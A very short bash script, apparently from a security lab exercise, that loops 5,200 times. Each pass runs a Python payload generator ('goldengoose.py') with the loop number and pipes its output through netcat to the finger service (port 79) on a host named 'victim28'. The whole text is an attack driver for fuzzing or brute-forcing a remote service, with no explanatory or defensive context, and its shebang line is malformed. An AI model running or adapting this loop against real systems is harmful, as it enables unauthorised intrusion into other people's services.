!/bin/bash
END=5200
for ((i=1;i<=END;i++));
do
   (python3 goldengoose.py $i) | nc victim28 79
done

